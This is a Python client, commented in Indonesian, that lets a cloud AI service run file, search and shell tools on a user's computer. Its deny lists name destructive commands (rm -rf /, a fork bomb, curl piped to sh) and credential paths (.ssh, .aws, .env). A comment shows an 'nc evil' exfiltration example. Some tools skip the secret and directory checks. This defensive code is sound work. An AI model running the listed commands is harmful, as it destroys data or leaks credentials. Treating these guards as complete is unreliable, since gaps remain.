#!/usr/bin/env python3
"""
BotNesia Local Agent — jalankan di komputer Anda agar AI BotNesia bisa
mengakses file, terminal, dan browser lokal.

Tidak perlu install manual — script ini auto-install dependency yang dibutuhkan.

Penggunaan:
    python botnesia_local_agent.py --token <jwt-dari-dashboard>
    python botnesia_local_agent.py --token <jwt> --url wss://app.botnesia.uk/api/local-agent/ws

Tools yang tersedia:
    read_file    — baca isi file
    write_file   — tulis file (butuh approval)
    list_dir     — lihat isi folder
    find_files   — cari file berdasarkan nama/pattern
    run_command  — jalankan perintah shell (butuh approval untuk perintah berbahaya)
    get_info     — info sistem (hostname, OS, disk, dll)
"""
import argparse
import asyncio
import glob
import json
import os
import platform
import re
import shutil
import subprocess
import sys
import time
import getpass

# Auto-install websockets jika belum ada
try:
    import websockets  # noqa: F401
except ImportError:
    print("📦 Menginstall dependency 'websockets'...")
    result = subprocess.run(
        [sys.executable, "-m", "pip", "install", "websockets",
         "--break-system-packages", "--quiet"],
        capture_output=True, text=True,
    )
    if result.returncode != 0:
        # Fallback: coba tanpa --break-system-packages (Windows/Mac/venv)
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "websockets", "--quiet"],
            check=True,
        )
    print("✅ websockets terinstall.\n")

# ─── Konfigurasi ──────────────────────────────────────────────────────────────

VERSION = "1.0.0"
DEFAULT_URL = "wss://app.botnesia.uk/api/local-agent/ws"
MAX_FILE_SIZE = 100 * 1024       # 100 KB
MAX_OUTPUT_SIZE = 50 * 1024      # 50 KB
COMMAND_TIMEOUT = 30             # detik

# Perintah yang selalu butuh approval user
DANGEROUS_PATTERNS = [
    "rm ", "rmdir", "del ", "format", "mkfs",
    "sudo", "chmod 777", "chown",
    "> /dev/", "dd if=",
    "curl.*|.*sh", "wget.*|.*sh",
    "DROP TABLE", "DELETE FROM", "TRUNCATE",
]

SAFE_READONLY_COMMANDS = [
    "ls", "dir", "pwd", "echo",
    "grep", "find", "which", "whoami", "hostname", "uname",
    "ps", "df", "du", "free", "date",
    "python --version", "python3 --version", "node --version",
    "git status", "git log", "git diff",
]
# Catatan: `cat`/`head`/`tail`/`env`/`printenv` SENGAJA dikeluarkan dari
# daftar auto-safe -- mereka bisa membaca kredensial (.env/kunci/token) atau
# men-dump environment. Kini butuh approval DAN tetap tunduk pada secret-guard
# di bawah (baca file rahasia diblok total).

# ── H-04: HARD DENYLIST (blokir total, TIDAK bisa di-approve) ────────────
# Perintah destruktif/berisiko-tinggi yang tak boleh dijalankan agent sama
# sekali, walau user menekan "y". Pola dicocokkan terhadap command yang sudah
# dinormalisasi (spasi/hilangkan quote sederhana) untuk mempersempit bypass.
_FORBIDDEN_PATTERNS: list[str] = [
    r"\brm\s+-[a-z]*r[a-z]*f\b\s+(/|~|\$home|\.\s*$|\*)",  # rm -rf / ~ * .
    r"\brm\s+-[a-z]*f[a-z]*r\b\s+(/|~|\$home|\*)",
    r":\(\)\s*\{.*\|.*&\s*\}\s*;",     # fork bomb :(){ :|:& };:
    r"\bmkfs\b", r"\bdd\s+if=", r"\bshred\b",
    r">\s*/dev/(sd|hd|nvme|disk)", r"\bwipefs\b",
    r"\bshutdown\b", r"\breboot\b", r"\bhalt\b", r"\bpoweroff\b", r"\binit\s+0\b",
    r"\b(sudo|doas|su)\b",
    r"\bchmod\s+-?R?\s*777\b",
    r"(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba)?sh\b",  # curl … | sh / wget … | bash
    r"\bmkfs\.", r"\bfdisk\b", r"\bparted\b",
]

# ── H-04: file rahasia yang TIDAK BOLEH dibaca/direferensikan agent ──────
_SECRET_PATH_PATTERNS: list[str] = [
    r"(^|[\s'\"/=])\.env(\.|\b)",           # .env / .env.local (tapi .env.example diizinkan, dicek terpisah)
    r"\bid_rsa\b", r"\bid_ed25519\b", r"\bid_ecdsa\b",
    r"[\w./-]*\.pem\b", r"[\w./-]*\.key\b", r"[\w./-]*\.p12\b", r"[\w./-]*\.pfx\b",
    r"\.ssh/", r"\.aws/", r"\.gnupg/", r"\.kube/",
    r"\bcredentials(\.json)?\b", r"\bservice[_-]?account\b", r"\bservice[_-]?role\b",
    r"\bsecrets?\.(json|ya?ml|txt|env)\b",
    r"\.pgpass\b", r"\.netrc\b", r"\bmaster\.key\b",
]

# ── H-04: perintah yang men-dump environment (bisa berisi secret) ────────
_ENV_DUMP_PATTERNS: list[str] = [
    r"^\s*env\s*$", r"^\s*printenv\b", r"\bexport\s+-p\b", r"\bset\s*$",
    r"\$\{?[a-z_]*(key|token|secret|password|passwd)[a-z_]*\}?",  # echo $API_KEY (command dinormalisasi ke lowercase)
]

# ── H-04: metakarakter shell = command majemuk (HARUS approval) ─────────
# Bila command mengandung separator/metakarakter shell (; | & && || ` $()
# > < newline), itu adalah command majemuk. First-word check tidak bisa
# dipercaya karena bagian SETELAH separator bebas (mis. `ls; python -c …`,
# `cat x | nc evil 1234`). Command majemuk SENANTIASA butuh approval eksplisit.
_SHELL_METACHAR_RE = re.compile(
    r"(?:;|\|\||&&|\||`|\$\(|\$\{|\bnewgrp\b|>|<|\n)"
)

# ── H-04: allowlist read-only TERSTRUKTUR (argumen sadar) ───────────────
# Daftar command read-only yang boleh auto-jalan (tanpa approval) — diperiksa
# berdasarkan struktur token, bukan sekadar first-word, agar `python -c …`
# (eksekusi kode) / `git push` (mutasi) TIDAK dianggap aman walau first-word
# (`python`/`git`) terdaftar. Hanya pasangan (program, sub-perintah aman)
# yang eksplisit diizinkan.
# Format: { program: { pola arg yang aman (regex, dicocokkan ke sisa command) } }
# Pola `^$` artinya "tanpa argumen".
_SAFE_READONLY_PROGRAMS: dict[str, list[re.Pattern]] = {
    "ls":   [re.compile(r"^[A-Za-z0-9 _./\-]+$")],            # ls -la /dir
    "dir":  [re.compile(r"^[A-Za-z0-9 _./\-]+$")],
    "pwd":  [re.compile(r"^$")],
    "echo": [re.compile(r"^[A-Za-z0-9 _./\-:]+$")],           # echo teks polos
    "grep": [re.compile(r"^[A-Za-z0-9 _./\-*:]+$")],
    "find": [re.compile(r"^[A-Za-z0-9 _./\-*]+$")],
    "which":   [re.compile(r"^[A-Za-z0-9 _./\-]+$")],
    "whoami":  [re.compile(r"^$")],
    "hostname":[re.compile(r"^$")],
    "uname":   [re.compile(r"^[A-Za-z\-]+$")],                # uname -a
    "date":    [re.compile(r"^[A-Za-z0-9 +:./\-]+$")],
    "df":      [re.compile(r"^[A-Za-z0-9 _./\-]+$")],
    "du":      [re.compile(r"^[A-Za-z0-9 _./\-]+$")],
    "free":    [re.compile(r"^[A-Za-z\-]+$")],                # free -h
    "ps":      [re.compile(r"^[A-Za-z0-9 _./\-]+$")],
    "python":  [re.compile(r"^\-\-version$"), re.compile(r"^\-v$")],   # HANYA versi
    "python3": [re.compile(r"^\-\-version$"), re.compile(r"^\-v$")],
    "node":    [re.compile(r"^\-\-version$"), re.compile(r"^\-v$")],
    "git":     [re.compile(r"^status\b"), re.compile(r"^log\b"), re.compile(r"^diff\b"),
                re.compile(r"^show\b"), re.compile(r"^branch$"), re.compile(r"^remote\b")],
}


def has_shell_metacharacter(command: str) -> bool:
    """True bila command memuat separator/metakarakter shell (command majemuk).

    Diperiksa terhadap command mentah (bukan hasil normalisasi) karena
    normalisasi ``re.sub(r\"\\s+\",\" \")`` menghapus newline — padahal newline
    adalah salah satu vektor injeksi command."""
    return bool(_SHELL_METACHAR_RE.search(command or ""))


def is_safe_readonly(command: str) -> bool:
    """True bila command TERSTRUKTUR aman (read-only, tanpa metakarakter shell,
    argumen cocok pola allowlist). Bukan sekadar cek first-word: `python -c …`
    atau `git push` mengembalikan False walau programnya terdaftar."""
    norm = _normalize_command(command)
    if not norm or has_shell_metacharacter(command):
        return False
    tokens = norm.split()
    program = tokens[0]
    rest = " ".join(tokens[1:])
    patterns = _SAFE_READONLY_PROGRAMS.get(program)
    if not patterns:
        return False
    return any(pat.match(rest) for pat in patterns)

# Direktori yang boleh diakses agent (root). Batasi ke HOME + cwd proses.
# Bisa dipersempit lewat env BOTNESIA_AGENT_ROOTS (path dipisah ':').
def _allowed_roots() -> list[str]:
    raw = os.environ.get("BOTNESIA_AGENT_ROOTS", "").strip()
    if raw:
        return [os.path.realpath(os.path.expanduser(p)) for p in raw.split(os.pathsep) if p.strip()]
    return [os.path.realpath(os.path.expanduser("~"))]


def _normalize_command(command: str) -> str:
    c = command.lower()
    c = c.replace("'", "").replace('"', "").replace("\\", "")  # buang quote/escape sederhana
    c = re.sub(r"\s+", " ", c).strip()
    return c


def is_forbidden(command: str) -> tuple[bool, str]:
    """Hard block: destruktif / secret-read / env-dump. Return (blocked, reason)."""
    norm = _normalize_command(command)
    for pat in _FORBIDDEN_PATTERNS:
        if re.search(pat, norm):
            return True, "Perintah destruktif/berisiko tinggi diblokir oleh kebijakan keamanan."
    for pat in _ENV_DUMP_PATTERNS:
        if re.search(pat, norm):
            return True, "Perintah yang membocorkan environment/secret diblokir."
    if references_secret(command):
        return True, "Perintah mereferensikan file rahasia (kredensial/kunci/token) dan diblokir."
    return False, ""


def references_secret(command: str) -> bool:
    """True bila command menyentuh file rahasia. `.env.example` dikecualikan."""
    norm = _normalize_command(command)
    # izinkan file contoh yang memang publik
    sanitized = norm.replace(".env.example", "").replace(".env.sample", "").replace(".env.template", "")
    return any(re.search(pat, sanitized) for pat in _SECRET_PATH_PATTERNS)


def is_within_allowed_dir(path: str, roots: list[str] = None) -> bool:
    """True bila `path` (setelah resolusi symlink/..) berada di dalam salah satu root."""
    roots = roots or _allowed_roots()
    try:
        real = os.path.realpath(os.path.expanduser(path or "."))
    except Exception:
        return False
    for root in roots:
        if real == root or real.startswith(root + os.sep):
            return True
    return False


def _audit_agent_command(command: str, *, decision: str, cwd: str) -> None:
    """Catat setiap keputusan eksekusi command ke audit log lokal."""
    try:
        log_dir = os.path.expanduser("~/.botnesia")
        os.makedirs(log_dir, exist_ok=True)
        line = json.dumps({
            "ts": time.strftime("%Y-%m-%dT%H:%M:%S"),
            "decision": decision, "cwd": cwd, "command": command[:500],
        }, ensure_ascii=False)
        with open(os.path.join(log_dir, "agent_audit.log"), "a", encoding="utf-8") as fh:
            fh.write(line + "\n")
    except Exception:
        pass


def _strict_allowlist_enabled() -> bool:
    """Strict allowlist mode (default-deny). Aktif via env
    BOTNESIA_AGENT_STRICT_ALLOWLIST=1. Saat aktif, HANYA command yang lolos
    ``is_safe_readonly`` yang auto-jalan; command lain (termasuk yang dulu
    lolos via first-word lemah) butuh approval. Default OFF = backward-compat."""
    return os.environ.get("BOTNESIA_AGENT_STRICT_ALLOWLIST", "").strip() in ("1", "true", "yes", "on")


def is_dangerous(command: str) -> bool:
    """Tentukan apakah command butuh approval eksplisit user.

    Sejak hardening H-04:
    1. Pola berbahaya (DANGEROUS_PATTERNS) → selalu butuh approval.
    2. Command majemuk (mengandung metakarakter shell ``;|&`$()><``) → selalu
       butuh approval, karena first-word aman tidak menjamin bagian setelah
       separator (mis. ``ls; python -c …``).
    3. Program yang ada di allowlist terstruktur (``_SAFE_READONLY_PROGRAMS``)
       dievaluasi argumennya: cocok pola → aman; tidak cocok (mis.
       ``python -c …``, ``git push``) → butuh approval. TIDAK jatuh ke
       first-word check lemah agar celah eksekusi-kode tertutup.
    4. Program LAIN (belum terdaftar): mode backward-compat memakai first-word
       check lama; strict mode (BOTNESIA_AGENT_STRICT_ALLOWLIST=1) = default-deny."""
    cmd_lower = command.lower()
    if any(p.lower() in cmd_lower for p in DANGEROUS_PATTERNS):
        return True
    # Command majemuk = selalu butuh approval (first-word tidak bisa dipercaya).
    if has_shell_metacharacter(command):
        return True
    tokens = cmd_lower.split()
    program = tokens[0] if tokens else ""
    # Program terdaftar → evaluasi argumen (argumen sadar, bukan first-word).
    if program in _SAFE_READONLY_PROGRAMS:
        return not is_safe_readonly(command)
    # Program tak terdaftar: strict = default-deny; backward-compat = first-word.
    if _strict_allowlist_enabled():
        return True
    return program not in [c.split()[0] for c in SAFE_READONLY_COMMANDS]


async def ask_approval(tool: str, description: str) -> bool:
    """Tanya user di terminal apakah aksi ini boleh dijalankan."""
    print(f"\n{'='*60}")
    print(f"⚠️  BotNesia meminta izin menjalankan aksi:")
    print(f"   Tool   : {tool}")
    print(f"   Detail : {description}")
    print(f"{'='*60}")
    loop = asyncio.get_running_loop()
    answer = await loop.run_in_executor(None, lambda: input("Izinkan? (y/n): ").strip().lower())
    approved = answer in ("y", "yes", "ya", "iya")
    if approved:
        print("✅ Disetujui.\n")
    else:
        print("❌ Ditolak.\n")
    return approved


# ─── Tool implementations ─────────────────────────────────────────────────────

async def tool_read_file(args: dict) -> dict:
    path = os.path.expanduser(args.get("path", ""))
    if not path:
        return {"success": False, "error": "Parameter 'path' diperlukan"}
    # H-04: jangan pernah baca kredensial, dan jangan keluar dari area diizinkan.
    if references_secret(path):
        _audit_agent_command(f"read_file {path}", decision="blocked_secret", cwd=path)
        return {"success": False, "error": "Akses file rahasia (kredensial/kunci/token) ditolak."}
    if not is_within_allowed_dir(path):
        _audit_agent_command(f"read_file {path}", decision="blocked_cwd", cwd=path)
        return {"success": False, "error": "Path di luar area yang diizinkan agent."}
    if not os.path.exists(path):
        return {"success": False, "error": f"File tidak ditemukan: {path}"}
    if not os.path.isfile(path):
        return {"success": False, "error": f"Bukan file: {path}"}
    size = os.path.getsize(path)
    if size > MAX_FILE_SIZE:
        return {"success": False, "error": f"File terlalu besar ({size//1024}KB, max {MAX_FILE_SIZE//1024}KB)"}
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            content = f.read()
        return {"success": True, "path": path, "content": content, "size": size}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def tool_write_file(args: dict) -> dict:
    path = os.path.expanduser(args.get("path", ""))
    content = args.get("content", "")
    if not path:
        return {"success": False, "error": "Parameter 'path' diperlukan"}
    # H-04: jangan menimpa file rahasia & jangan menulis di luar area diizinkan.
    if references_secret(path):
        _audit_agent_command(f"write_file {path}", decision="blocked_secret", cwd=path)
        return {"success": False, "error": "Menulis ke file rahasia ditolak."}
    if not is_within_allowed_dir(path):
        _audit_agent_command(f"write_file {path}", decision="blocked_cwd", cwd=path)
        return {"success": False, "error": "Path di luar area yang diizinkan agent."}
    approved = await ask_approval("write_file", f"Tulis file: {path} ({len(content)} karakter)")
    if not approved:
        return {"success": False, "error": "Ditolak oleh user"}
    try:
        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        return {"success": True, "path": path, "bytes_written": len(content.encode())}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def tool_list_dir(args: dict) -> dict:
    path = os.path.expanduser(args.get("path", "."))
    if not os.path.exists(path):
        return {"success": False, "error": f"Direktori tidak ditemukan: {path}"}
    if not os.path.isdir(path):
        return {"success": False, "error": f"Bukan direktori: {path}"}
    try:
        items = []
        for name in sorted(os.listdir(path))[:200]:
            full = os.path.join(path, name)
            stat = os.stat(full)
            items.append({
                "name": name,
                "type": "dir" if os.path.isdir(full) else "file",
                "size": stat.st_size,
            })
        return {"success": True, "path": path, "items": items, "total": len(items)}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def tool_find_files(args: dict) -> dict:
    pattern = args.get("pattern", "*")
    search_dir = os.path.expanduser(args.get("dir", "."))
    if not os.path.isdir(search_dir):
        return {"success": False, "error": f"Direktori tidak ditemukan: {search_dir}"}
    try:
        matches = []
        for root, dirs, files in os.walk(search_dir):
            # Skip hidden & node_modules
            dirs[:] = [d for d in dirs if not d.startswith(".") and d != "node_modules" and d != "__pycache__"]
            for fname in files:
                if glob.fnmatch.fnmatch(fname.lower(), pattern.lower()):
                    matches.append(os.path.join(root, fname))
                    if len(matches) >= 100:
                        break
            if len(matches) >= 100:
                break
        return {"success": True, "pattern": pattern, "dir": search_dir, "matches": matches, "total": len(matches)}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def tool_run_command(args: dict) -> dict:
    command = args.get("command", "")
    cwd = os.path.expanduser(args.get("cwd", "."))
    if not command:
        return {"success": False, "error": "Parameter 'command' diperlukan"}

    # H-04 (1): hard denylist — destruktif / baca-secret / dump-env DIBLOKIR
    # total, tidak bisa di-approve. Ini mencegah RCE merusak & pembocoran
    # kredensial walau ada instruksi/prompt-injection dari sisi cloud.
    blocked, reason = is_forbidden(command)
    if blocked:
        _audit_agent_command(command, decision="blocked", cwd=cwd)
        return {"success": False, "error": reason}

    # H-04 (2): batasi working directory ke root yang diizinkan (default HOME).
    # Cegah agent keluar dari area kerja / path traversal via cwd.
    if not is_within_allowed_dir(cwd):
        _audit_agent_command(command, decision="blocked_cwd", cwd=cwd)
        return {"success": False, "error": "Working directory di luar area yang diizinkan agent."}

    # H-04 (3): perintah non-allowlist tetap butuh approval eksplisit user.
    needs_approval = is_dangerous(command)
    if needs_approval:
        approved = await ask_approval("run_command", f"$ {command}")
        if not approved:
            _audit_agent_command(command, decision="denied_by_user", cwd=cwd)
            return {"success": False, "error": "Ditolak oleh user"}

    _audit_agent_command(command, decision="executed", cwd=cwd)
    try:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True,
            timeout=COMMAND_TIMEOUT, cwd=cwd if os.path.isdir(cwd) else None,
        )
        stdout = result.stdout[:MAX_OUTPUT_SIZE]
        stderr = result.stderr[:MAX_OUTPUT_SIZE]
        return {
            "success": result.returncode == 0,
            "command": command,
            "stdout": stdout,
            "stderr": stderr,
            "exit_code": result.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"success": False, "error": f"Perintah timeout setelah {COMMAND_TIMEOUT}s"}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def tool_get_info(args: dict) -> dict:
    try:
        disk = shutil.disk_usage(os.path.expanduser("~"))
        return {
            "success": True,
            "hostname": platform.node(),
            "platform": platform.system(),
            "platform_version": platform.version(),
            "python_version": sys.version.split()[0],
            "username": getpass.getuser(),
            "home_dir": os.path.expanduser("~"),
            "cwd": os.getcwd(),
            "disk_total_gb": round(disk.total / 1e9, 1),
            "disk_used_gb": round(disk.used / 1e9, 1),
            "disk_free_gb": round(disk.free / 1e9, 1),
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


async def tool_search_text(args: dict) -> dict:
    """Cari teks/pattern di dalam file (seperti grep)."""
    pattern = args.get("pattern", "")
    search_dir = os.path.expanduser(args.get("dir", "."))
    file_ext = args.get("file_ext", "")  # e.g. ".py", ".js"
    if not pattern:
        return {"success": False, "error": "Parameter 'pattern' diperlukan"}
    if not os.path.isdir(search_dir):
        return {"success": False, "error": f"Direktori tidak ditemukan: {search_dir}"}
    try:
        results = []
        for root, dirs, files in os.walk(search_dir):
            dirs[:] = [d for d in dirs if not d.startswith(".") and d not in ("node_modules", "__pycache__", ".git", "dist", ".venv")]
            for fname in files:
                if file_ext and not fname.endswith(file_ext):
                    continue
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        for i, line in enumerate(f, 1):
                            if pattern.lower() in line.lower():
                                results.append({"file": fpath, "line": i, "text": line.rstrip()})
                                if len(results) >= 100:
                                    break
                except Exception:
                    pass
                if len(results) >= 100:
                    break
            if len(results) >= 100:
                break
        return {"success": True, "pattern": pattern, "dir": search_dir, "matches": results, "total": len(results)}
    except Exception as e:
        return {"success": False, "error": str(e)}


async def tool_tree(args: dict) -> dict:
    """Tampilkan struktur direktori (tree view)."""
    path = os.path.expanduser(args.get("path", "."))
    max_depth = min(int(args.get("max_depth", 3)), 5)
    if not os.path.isdir(path):
        return {"success": False, "error": f"Direktori tidak ditemukan: {path}"}

    def _build(dir_path, depth, prefix=""):
        if depth > max_depth:
            return []
        lines = []
        try:
            entries = sorted(os.listdir(dir_path))
            entries = [e for e in entries if not e.startswith(".") and e not in ("node_modules", "__pycache__", ".git", "dist", ".venv")]
            for i, entry in enumerate(entries):
                is_last = i == len(entries) - 1
                connector = "└── " if is_last else "├── "
                full = os.path.join(dir_path, entry)
                is_dir = os.path.isdir(full)
                lines.append(f"{prefix}{connector}{entry}{'/' if is_dir else ''}")
                if is_dir and depth < max_depth:
                    ext = "    " if is_last else "│   "
                    lines.extend(_build(full, depth + 1, prefix + ext))
        except PermissionError:
            pass
        return lines

    base = os.path.basename(path.rstrip("/")) or path
    lines = [base + "/"] + _build(path, 1)
    return {"success": True, "path": path, "tree": "\n".join(lines), "line_count": len(lines)}


async def tool_scan_project(args: dict) -> dict:
    """Scan direktori project: deteksi jenis project, file kunci, statistik file."""
    path = os.path.expanduser(args.get("path", "."))
    if not os.path.isdir(path):
        return {"success": False, "error": f"Direktori tidak ditemukan: {path}"}

    KEY_FILES = [
        "package.json", "package-lock.json", "yarn.lock",
        "requirements.txt", "pyproject.toml", "setup.py",
        "Cargo.toml", "go.mod", "pom.xml", "build.gradle",
        "Makefile", "docker-compose.yml", "Dockerfile",
        ".env.example", "README.md", "readme.md",
        "main.py", "app.py", "index.js", "index.ts", "main.go",
    ]
    found_files = {}
    for fname in KEY_FILES:
        full = os.path.join(path, fname)
        if os.path.isfile(full):
            try:
                size = os.path.getsize(full)
                with open(full, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read(3000)
                found_files[fname] = {"size": size, "preview": content}
            except Exception:
                found_files[fname] = {"size": 0, "preview": ""}

    ext_count: dict = {}
    total_files = 0
    for root, dirs, files in os.walk(path):
        dirs[:] = [d for d in dirs if not d.startswith(".") and d not in ("node_modules", "__pycache__", ".git", "dist", ".venv")]
        for fname in files:
            total_files += 1
            ext = os.path.splitext(fname)[1].lower()
            ext_count[ext] = ext_count.get(ext, 0) + 1
        if total_files > 5000:
            break

    project_type = "unknown"
    if "package.json" in found_files:
        project_type = "node/javascript"
    elif "requirements.txt" in found_files or "pyproject.toml" in found_files or "main.py" in found_files:
        project_type = "python"
    elif "Cargo.toml" in found_files:
        project_type = "rust"
    elif "go.mod" in found_files:
        project_type = "go"

    return {
        "success": True,
        "path": path,
        "project_type": project_type,
        "total_files": total_files,
        "key_files": list(found_files.keys()),
        "key_files_preview": {k: v["preview"][:500] for k, v in found_files.items()},
        "extensions": dict(sorted(ext_count.items(), key=lambda x: -x[1])[:15]),
    }


TOOLS = {
    "read_file": tool_read_file,
    "write_file": tool_write_file,
    "list_dir": tool_list_dir,
    "find_files": tool_find_files,
    "run_command": tool_run_command,
    "get_info": tool_get_info,
    "search_text": tool_search_text,
    "tree": tool_tree,
    "scan_project": tool_scan_project,
}


# ─── WebSocket client ─────────────────────────────────────────────────────────

async def run_agent(url: str, token: str):
    try:
        import websockets
    except ImportError:
        print("❌ Package 'websockets' belum terinstall. Jalankan: pip install websockets")
        sys.exit(1)

    ws_url = f"{url}?token={token}"
    print(f"🔗 Menghubungkan ke BotNesia Local Agent...")
    print(f"   URL: {url}")

    reconnect_delay = 5

    while True:
        try:
            async with websockets.connect(ws_url, ping_interval=30, ping_timeout=10) as ws:
                # Kirim pesan ready
                ready_msg = {
                    "type": "ready",
                    "hostname": platform.node(),
                    "platform": f"{platform.system()} {platform.release()}",
                    "username": getpass.getuser(),
                    "version": VERSION,
                }
                await ws.send(json.dumps(ready_msg))

                # Tunggu konfirmasi
                raw = await asyncio.wait_for(ws.recv(), timeout=10)
                msg = json.loads(raw)
                if msg.get("type") == "connected":
                    print(f"\n✅ {msg.get('message', 'Terhubung!')}")
                    print(f"   Host     : {platform.node()}")
                    print(f"   Platform : {platform.system()} {platform.release()}")
                    print(f"   User     : {getpass.getuser()}")
                    print(f"\n👂 Menunggu perintah dari BotNesia... (Ctrl+C untuk berhenti)\n")
                    reconnect_delay = 5  # reset delay setelah berhasil konek

                async for raw in ws:
                    try:
                        msg = json.loads(raw)
                    except json.JSONDecodeError:
                        continue

                    msg_type = msg.get("type")

                    if msg_type == "ping":
                        await ws.send(json.dumps({"type": "pong"}))

                    elif msg_type == "execute":
                        command_id = msg.get("command_id", "")
                        tool = msg.get("tool", "")
                        args = msg.get("args", {})

                        print(f"📥 Perintah masuk: {tool}({json.dumps(args, ensure_ascii=False)[:80]})")

                        handler = TOOLS.get(tool)
                        if not handler:
                            result = {"success": False, "error": f"Tool tidak dikenal: {tool}"}
                        else:
                            try:
                                result = await handler(args)
                            except Exception as e:
                                result = {"success": False, "error": str(e)}

                        result["command_id"] = command_id
                        result["type"] = "result"
                        await ws.send(json.dumps(result, default=str))

                        status = "✅" if result.get("success") else "❌"
                        print(f"{status} Selesai: {tool}")

                    elif msg_type == "shutdown":
                        print("\n🔌 Server meminta disconnect. Sampai jumpa!")
                        return

        except KeyboardInterrupt:
            print("\n\n👋 BotNesia Local Agent dihentikan.")
            return
        except Exception as e:
            print(f"\n⚠️  Koneksi terputus: {e}")
            print(f"   Mencoba reconnect dalam {reconnect_delay} detik...")
            await asyncio.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 2, 60)


# ─── CLI ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="BotNesia Local Agent — hubungkan komputer Anda ke BotNesia AI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Cara mendapatkan token:
  1. Buka dashboard BotNesia → Settings → API Keys
  2. Generate API key baru
  3. Salin token dan gunakan di sini

Contoh:
  python botnesia_local_agent.py --token eyJhbGciOiJ...
  python botnesia_local_agent.py --token eyJ... --url wss://app.botnesia.uk/api/local-agent/ws
        """
    )
    parser.add_argument("--token", "-t", required=True, help="JWT token dari dashboard BotNesia")
    parser.add_argument("--url", "-u", default=DEFAULT_URL, help=f"WebSocket URL (default: {DEFAULT_URL})")

    args = parser.parse_args()

    print("=" * 60)
    print("  BotNesia Local Agent v" + VERSION)
    print("  AI yang bisa kerja di komputer Anda")
    print("=" * 60)

    asyncio.run(run_agent(args.url, args.token))


if __name__ == "__main__":
    main()
